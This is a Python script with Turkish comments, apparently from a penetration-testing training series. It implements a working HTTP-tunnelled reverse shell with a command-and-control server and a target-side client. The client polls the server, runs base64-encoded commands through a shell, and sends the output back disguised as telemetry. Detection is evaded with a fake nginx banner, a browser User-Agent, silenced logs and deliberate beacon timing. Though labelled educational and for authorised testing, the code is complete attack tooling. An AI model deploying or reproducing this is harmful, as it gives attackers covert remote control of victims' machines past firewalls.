#!/usr/bin/env python3
"""
HTTP Tünelleme ile Reverse Shell
=================================
Normal HTTP GET/POST istekleri gibi görünen trafik üzerinden
komut çalıştırır. Güvenlik duvarı bunu normal web trafiği sanır.

NASIL ÇALIŞIR:
--------------
1) Kali'de bu scripti server modunda başlatın
2) Hedef makinede client modunda çalıştırın
3) Komutlar HTTP istekleri içinde gizlenir

KULLANIM:
---------
  Kali (Sunucu):   python3 3_HTTP_Tunnel.py --server --port 80
  Hedef (İstemci):  python3 3_HTTP_Tunnel.py --client --host 10.10.14.1 --port 80

NOT: Yalnızca izinli test ortamlarında kullanın.
"""

import http.server
import urllib.request
import urllib.parse
import subprocess
import argparse
import base64
import json
import sys
import os
import time

# =============================================
#  SUNUCU TARAFI (Kali'de çalıştırın)
# =============================================

class C2Handler(http.server.BaseHTTPRequestHandler):
    """Komut & Kontrol (C2) HTTP Handler"""
    
    # Komut kuyruğu
    pending_command = ""
    
    def log_message(self, format, *args):
        """HTTP loglarını gizle (normal görünsün)."""
        pass
    
    def do_GET(self):
        """
        Hedef makine GET ile komut sormaya gelir.
        Güvenlik duvarı bu trafiği normal web isteği olarak görür.
        """
        if self.path == "/updates":
            # Bekleyen komut varsa gönder
            if C2Handler.pending_command:
                cmd_encoded = base64.b64encode(
                    C2Handler.pending_command.encode()
                ).decode()
                
                # Normal bir JSON API yanıtı gibi görünür
                response = json.dumps({
                    "status": "update_available",
                    "version": cmd_encoded,
                    "timestamp": int(time.time())
                })
                C2Handler.pending_command = ""
            else:
                response = json.dumps({
                    "status": "up_to_date",
                    "timestamp": int(time.time())
                })
            
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Server", "nginx/1.24.0")  # Normal sunucu gibi görün
            self.end_headers()
            self.wfile.write(response.encode())
        else:
            # Diğer isteklere normal 404 döndür
            self.send_response(404)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"<h1>404 Not Found</h1>")
    
    def do_POST(self):
        """
        Hedef makine komut çıktısını POST ile gönderir.
        Normal bir form gönderimi gibi görünür.
        """
        if self.path == "/api/telemetry":
            content_length = int(self.headers.get("Content-Length", 0))
            post_data = self.rfile.read(content_length)
            
            try:
                data = json.loads(post_data)
                output = base64.b64decode(data.get("data", "")).decode(
                    "utf-8", errors="replace"
                )
                print(output, end="")
            except Exception:
                pass
            
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"received": true}')

def run_server(port):
    """C2 sunucusunu başlat."""
    import threading
    
    server = http.server.HTTPServer(("0.0.0.0", port), C2Handler)
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()
    
    print(f"[*] HTTP C2 Sunucusu başlatıldı: 0.0.0.0:{port}")
    print("[*] Bağlantı bekleniyor...")
    print("[*] Komut yazın, hedef makinede çalıştırılacak.\n")
    
    try:
        while True:
            cmd = input("http-shell> ")
            if cmd.strip().lower() in ["exit", "quit"]:
                print("[*] Sunucu kapatılıyor...")
                break
            if cmd.strip():
                C2Handler.pending_command = cmd
                time.sleep(0.5)  # Yanıt için bekle
    except KeyboardInterrupt:
        print("\n[*] Sunucu kapatılıyor...")
    finally:
        server.shutdown()


# =============================================
#  İSTEMCİ TARAFI (Hedef makinede çalıştırın)
# =============================================

def run_client(host, port):
    """Hedef makinede çalışan HTTP istemcisi."""
    url = f"http://{host}:{port}"
    
    while True:
        try:
            # Sunucudan komut iste (normal GET isteği gibi)
            req = urllib.request.Request(
                f"{url}/updates",
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                  "AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
                    "Accept": "application/json"
                }
            )
            
            with urllib.request.urlopen(req, timeout=10) as response:
                data = json.loads(response.read())
            
            if data.get("status") == "update_available":
                # Komutu çöz ve çalıştır
                command = base64.b64decode(data["version"]).decode()
                
                if command.lower() in ["exit", "quit"]:
                    break
                
                if command.lower().startswith("cd "):
                    try:
                        os.chdir(command[3:].strip())
                        output = f"[+] Dizin: {os.getcwd()}\n"
                    except Exception as e:
                        output = f"[-] Hata: {e}\n"
                else:
                    try:
                        output = subprocess.check_output(
                            command, shell=True,
                            stderr=subprocess.STDOUT,
                            timeout=30
                        ).decode("utf-8", errors="replace")
                    except subprocess.TimeoutExpired:
                        output = "[-] Zaman aşımı\n"
                    except Exception as e:
                        output = f"[-] Hata: {e}\n"
                
                if not output:
                    output = "[+] OK\n"
                
                # Çıktıyı POST ile gönder (telemetri verisi gibi görünür)
                post_data = json.dumps({
                    "data": base64.b64encode(output.encode()).decode(),
                    "client_id": "win10-workstation",
                    "type": "telemetry"
                }).encode()
                
                post_req = urllib.request.Request(
                    f"{url}/api/telemetry",
                    data=post_data,
                    headers={
                        "Content-Type": "application/json",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                      "AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
                    }
                )
                urllib.request.urlopen(post_req, timeout=10)
            
            time.sleep(2)  # 2 saniyede bir kontrol et (çok sık olursa şüpheli olur)
            
        except KeyboardInterrupt:
            break
        except Exception:
            time.sleep(5)  # Bağlantı hatası olursa 5 saniye bekle, tekrar dene
            continue


# =============================================
#  ANA GİRİŞ NOKTASI
# =============================================

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="HTTP Tünelleme ile Reverse Shell (Eğitim Amaçlı)"
    )
    parser.add_argument("--server", action="store_true", help="Sunucu modunda başlat (Kali)")
    parser.add_argument("--client", action="store_true", help="İstemci modunda başlat (Hedef)")
    parser.add_argument("--host", default="10.10.14.1", help="Sunucu IP adresi (client modu)")
    parser.add_argument("--port", type=int, default=80, help="Port numarası (varsayılan: 80)")
    
    args = parser.parse_args()
    
    if args.server:
        run_server(args.port)
    elif args.client:
        run_client(args.host, args.port)
    else:
        parser.print_help()
        print("\nÖrnekler:")
        print("  Kali:   python3 3_HTTP_Tunnel.py --server --port 80")
        print("  Hedef:  python3 3_HTTP_Tunnel.py --client --host 10.10.14.1 --port 80")
